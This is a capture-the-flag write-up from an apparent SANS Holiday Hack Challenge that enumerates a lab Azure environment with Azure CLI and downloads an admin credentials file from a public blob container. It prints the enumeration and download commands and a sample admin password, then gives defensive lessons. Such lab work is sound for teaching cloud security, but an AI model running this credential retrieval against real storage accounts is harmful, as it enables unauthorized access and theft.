> **Platform Name**: SANs Holiday Hack Challenge '25
> **Category**: #Cloud, #Azure, #Enumeration
> **Author**: Joe Lipinski
---
## Table of Contents
1. [Introduction](#introduction)
2. [Setup](#Setup)
3. [Reconnaissance](#reconnaissance)
4. [Enumeration](#enumeration)
5. [Exploitation](#exploitation)
6. [Post-Exploitation/Flag](#Post-Exploitation/Flag)
7. [Lessons Learned](#lessons%20learned)
8. [References](#References)

---
## Introduction

**Objective:**
Enumerate an Azure environment to discover a misconfigured public blob storage container and retrieve sensitive credentials stored within it.

**Description:**
The challenge provides access to an Azure CLI session. The goal is to enumerate the environment — accounts, storage accounts, and blob containers — to find and exfiltrate a file containing credentials from a publicly accessible blob container.

---
## Setup
- **Operating System:** Kali
- **Tools Used:** #AzureCLI

---
## Reconnaissance

### Enumerate Current Account
Identify the current user context before proceeding.

```bash
az account show | less
```

**Findings:**
- **Account**: `theneighborhood@theneighborhood.invalid`
- **Subscription**: `theneighborhood-sub`
- **Tenant ID**: `90a38eda-4006-4dd5-924c-6ca55cacc14d`

---
## Enumeration

### List Storage Accounts
```bash
az storage account list | less
```

This returns a storage account named `neighborhood2` in `theneighborhood-rg1`. Notably, `allowBlobPublicAccess` is set to `true` and `minimumTlsVersion` is `TLS1_0` — both security misconfigurations.

### List Storage Containers
```bash
az storage container list --account-name neighborhood2
```

**Interesting Discoveries:**
- **`public`**: `publicAccess: Blob` — publicly accessible
- **`private`**: `publicAccess: null` — private

### List Blobs in the Public Container
```bash
az storage blob list --account-name neighborhood2 --container-name public | less
```

**Interesting Discoveries:**
- **`admin_credentials.txt`**: Contains a note "admins only" — high-value target

---
## Exploitation

### Download the Credential File
```bash
az storage blob download --account-name neighborhood2 --container-name public --name "admin_credentials.txt" --file /dev/stdout | less
```

The file is publicly readable with no authentication due to `allowBlobPublicAccess: true`. It contains plaintext credentials for Azure Portal, Windows Server, SQL Server, Active Directory, Exchange, VMware, network switches, firewalls, backup servers, monitoring, SharePoint, and Git.

---
## Post-Exploitation/Flag

### Capturing the Flag

The flag is the content of `admin_credentials.txt`, which reveals the full credential set. The Azure Portal admin credential is:

```
User: azureadmin
Pass: AzUR3!P@ssw0rd#2025
```

> [!success] Flag
> `admin_credentials.txt` retrieved — Azure admin credentials exposed via public blob access

---
## Lessons Learned

- **`allowBlobPublicAccess: true` is dangerous**: Any blob in a public container is readable by anyone on the internet without authentication. This setting should be disabled at the storage account level unless explicitly required.
- **Minimum TLS version matters**: `TLS1_0` exposes connections to known downgrade attacks. Always enforce `TLS1_2` or higher.
- **Sensitive files don't belong in blob storage**: Credential files should be stored in Azure Key Vault, not flat files in storage containers — regardless of access settings.
- **`az storage account list` as a recon step**: Listing storage accounts and inspecting their properties is an early, low-noise enumeration step that can surface misconfigurations quickly.

---
## References
- [Azure Storage public access overview – Microsoft Docs](https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-overview)
- [Azure CLI `az storage` reference](https://learn.microsoft.com/en-us/cli/azure/storage)
- [Azure Key Vault – Microsoft Docs](https://learn.microsoft.com/en-us/azure/key-vault/general/overview)
- [MITRE ATT&CK T1530 – Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/)

---
**Disclaimer**
This write-up is for educational purposes only. Always obtain proper authorization before testing or exploiting any system.
